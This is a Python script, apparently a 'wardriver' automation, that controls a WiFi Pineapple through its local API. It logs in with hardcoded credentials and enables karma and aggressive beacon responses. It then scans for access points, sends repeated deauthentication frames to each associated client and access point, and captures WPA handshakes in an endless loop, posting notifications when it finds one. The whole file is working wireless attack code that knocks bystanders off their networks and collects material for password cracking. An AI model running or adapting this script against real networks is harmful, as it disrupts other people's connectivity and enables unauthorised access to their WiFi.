#!/usr/bin/env python3 

#todo: filter for 'Open' networks

import json, requests, time
from pathlib import Path

def basic_wardriver_flow():
    s = requests.Session()
    auth = dict()
    auth["username"] = "root"
    auth["password"] = "test"
    scanTime = 120
    
    authResp = s.post("http://172.16.42.1:1471/api/login", json.dumps(auth)).json()
    print(authResp["token"])
    if (authResp["token"] != None):
        print('>authorized')
        s.headers.update({'Authorization': 'Bearer '+authResp["token"]})
    else:
        print('>no token')
        exit -1
    print('>checking status')
    #reconStatusResp = s.get("http://172.16.42.1:1471/api/recon/status").json()
    #if (reconStatusResp["scanRunning"]):
    print('>stopping current scan')
    reconStopResp = s.post("http://172.16.42.1:1471/api/recon/stop").json()
    pineAPSettings = {}
    pineAPSettings["mode"] = {}
    pineAPSettings["settings"] = {}
    pineAPSettings["mode"] = "advanced"
    pineAPSettings["settings"]["enablePineAP"] = True
    pineAPSettings["settings"]["autostartPineAP"] = True
    pineAPSettings["settings"]["ap_channel"] = "11"
    pineAPSettings["settings"]["beacon_interval"] = "AGGRESSIVE"
    pineAPSettings["settings"]["beacon_response_interval"] = "AGGRESSIVE"
    pineAPSettings["settings"]["beacon_responses"] = True
    pineAPSettings["settings"]["karma"] = True
    pineAPSettings["settings"]["logging"] = True
    pineAPSettings["settings"]["connect_notifications"] = False
    pineAPSettings["settings"]["disconnect_notifications"] = False
    pineAPSettings["settings"]["capture_ssids"] = True
    pineAPSettings["settings"]["beacon_responses"] = True
    pineAPSettings["settings"]["broadcast_ssid_pool"] = False
    pineAPSettings["settings"]["pineap_mac"] = "5A:11:B0:A7:A9:09"
    pineAPSettings["settings"]["target_mac"] = "FF:FF:FF:FF:FF:FF"
    print('>applying settings')
    setSettingsResp = s.put("http://172.16.42.1:1471/api/pineap/settings", json.dumps(pineAPSettings)).json() # might need data = json.

    if (setSettingsResp["success"]):
        reconScanOpts = dict()
        reconScanOpts["live"] = False
        reconScanOpts["scan_time"] = scanTime
        reconScanOpts["band"] = "0"
        print('>starting recon')
        startReconResponse = s.post("http://172.16.42.1:1471/api/recon/start", json.dumps(reconScanOpts)).json()
    if (startReconResponse["scanID"] != None):
        time.sleep(scanTime)
        #print('>getting recon scan status')
        #reconStatusResponse = s.get("http://172.16.42.1:1471/api/recon/status").json()
        print('>stopping recon scan')
        #if (reconStatusResponse["scanRunning"]):
        s.post("http://172.16.42.1:1471/api/recon/stop").json()
        print('>getting results of recon scan by ID')
        scanResp = s.get("http://172.16.42.1:1471/api/recon/scans/" + str(startReconResponse["scanID"])).json()
        if (scanResp["APResults"] != None):
            print('>APs found!')
            for ap in scanResp["APResults"]:
                if (ap["clients"] != None):
                    print('>associated clients found! ('+str(len(ap["clients"]))+')')
                    clientDeauthPayload = dict() 
                    bssidDeauthPayload = dict()
                    handshakePayload = dict()
                    clientArray = []
                    handshakePayload["bssid"] = ap["bssid"]
                    print('>starting handshake')
                    s.post("http://172.16.42.1:1471/api/pineap/handshakes/start").json()
                    for client in ap["clients"]:
                        clientDeauthPayload["bssid"] = client["ap_mac"]
                        clientDeauthPayload["mac"] = client["client_mac"]
                        clientDeauthPayload["multiplier"] = 5
                        clientDeauthPayload["channel"] = 11
                        print('>deauthing client')
                        s.post("http://172.16.42.1:1471/api/pineap/deauth/client", json.dumps(clientDeauthPayload)).json()
                        clientArray.append(client["client_mac"])
                    
                    bssidDeauthPayload["bssid"] = ap["bssid"]
                    bssidDeauthPayload["multiplier"] = 5
                    bssidDeauthPayload["channel"] = 11
                    bssidDeauthPayload["clients"] = clientArray
                    print('>deauthing APs')
                    s.post("http://172.16.42.1:1471/api/pineap/deauth/ap", json.dumps(bssidDeauthPayload)).json()
                    time.sleep(30)
                    print('>stopping handshake')
                    s.post("http://172.16.42.1:1471/api/pineap/handshakes/stop").json()
                    print('>getting handshake result')
                    handshakesResultResp = s.get("http://172.16.42.1:1471/api/pineap/handshakes").json()
                    
                    notificationPayload = dict()
                    notificationPayload["level"] = 2
                    notificationPayload["module_name"] = "wardriver"
                    
                    if (handshakesResultResp["handshakes"] != None):    
                        notificationString = ""
                        for hs in handshakesResultResp["handshakes"]:
                            notificationString = "Found a handshake (" + hs["mac"] + ")!"
                            print('>found a handshake!')
                            notificationPayload["message"] = notificationString
                            s.put("http://172.16.42.1:1471/api/notifications", json.dumps(notificationPayload)).json()
                    else:
                        notificationString = "No handshakes captured :("
                        notificationPayload["message"] = notificationString
                        print('>no handshakes captured for this AP :(')
                        s.put("http://172.16.42.1:1471/api/notifications", json.dumps(notificationPayload)).json()
                else:
                    print('>no client associated with AP')
        else:
            print('>no APs found')
        basic_wardriver_flow()
basic_wardriver_flow()

